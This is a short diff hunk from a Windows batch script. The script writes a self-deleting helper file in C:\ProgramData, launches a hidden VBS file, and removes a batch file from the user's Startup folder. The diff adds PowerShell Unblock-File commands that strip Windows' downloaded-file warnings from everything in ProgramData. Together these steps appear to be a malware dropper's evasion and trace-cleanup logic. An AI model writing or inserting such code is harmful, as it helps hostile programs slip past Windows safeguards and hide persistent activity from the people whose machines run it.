@@ -55,6 +55,9 @@ echo timeout 1>> "C:\ProgramData\word.bat"
 echo del "C:\ProgramData\word.bat">> "C:\ProgramData\word.bat"
 echo del "C:\ProgramData\world.vbs">> "C:\ProgramData\word.bat"
 echo exit>> "C:\ProgramData\word.bat">> "C:\ProgramData\word.bat"
+powershell.exe Unblock-File -Path "*"
+powershell.exe Unblock-File -Path "C:\ProgramData\*"
+powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*"
 start "" "C:\ProgramData\world.vbs"
 timeout 0 >> nul
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat" >> nul
